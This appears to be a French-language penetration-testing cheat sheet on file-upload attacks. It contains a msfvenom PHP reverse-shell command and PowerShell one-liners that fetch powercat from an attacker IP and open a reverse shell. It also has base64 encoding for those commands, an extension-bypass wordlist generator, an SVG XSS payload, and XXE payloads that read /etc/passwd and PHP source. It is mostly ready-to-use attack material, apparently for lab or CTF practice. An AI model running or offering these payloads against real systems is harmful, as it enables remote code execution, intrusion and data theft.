Doit trouver comment passer les filtres.
* essayer d'autres extentions
* utiliser différentes casses
* encodage base64 peut servir

On peut peut-être utiliser ../../ ou autre pour déplacer le fichier et remplacer fichiers importants

powershell ou CMD?

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	
# Générer un reverse shell

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	
# Powershell	
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Attention à l'encodage. Linux va encoder and UTF-8 mais Powershell utilise UTF-16LE
	
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
echo "command" | iconv -t UTF-16LE | base64 -w0 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	
# CMD
Attention: Changer les " par des ‘ à l’intérieur de la commande.
	
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
PowerShell.exe -ExecutionPolicy Unrestricted -command "(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell"
PowerShell.exe -ExecutionPolicy Unrestricted -command "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.164/powercat.ps1')"
PowerShell.exe -ExecutionPolicy Unrestricted -command "./powercat -c 192.168.119.3 -p 4444 -e powershell"
PowerShell.exe -ExecutionPolicy Unrestricted -command "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.3/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Serveur de fichier HTTP
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
python -m http.server 80
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Outrepasser contremesures
#### Vérification côté client
* Modifier la requête 
* Modifier le code source
#### Vérification côté serveur
Fuzzer les extensions pour trouver ce qui est accepté
charactères à ajouter autour de l'extension
* %20
* %0a
* %00				PHP <= 5.X
* %0d0a
* /
* .\
* .
* …
* :					Avant l'extension sur un serveur Windows

génération de permutations

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.phps' '.phtm' '.pht' '.phar' '.phpt' '.pgif' '.phtml'; do
        echo "$char$ext.jpg" >> wordlist.txt
        echo "$ext$char.jpg" >> wordlist.txt
        echo ".jpg$char$ext" >> wordlist.txt
        echo ".jpg$ext$char" >> wordlist.txt
        echo "$ext$char" >> wordlist.txt
        echo "$char$ext" >> wordlist.txt
        echo "$ext" >> wordlist.txt
    done
done
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vérifier les octets magiques
	
#### Avancé
Ne peut pas exécuter de PHP
XSS par envoi de fichier html
Ajouter de quoi dans le metadata si il est affiché
le type MIME (ex: text/html) peut définir comment un fichier est affiché
XSS avec SVG
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
XXE inclusion de code dans XML. Possible avec divers documents. SVG, PDF, PowerPoint, Word
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Utiliser les noms de fichiers comme vecteur
#### Windows
|, <, >, *, ou ? comme référencé plus haut
(hackthebox.txt) we can use (HAC~1.TXT) or (HAC~2.TXT) On peut utiliser WEB~.CONF pour  réécrire sur web.conf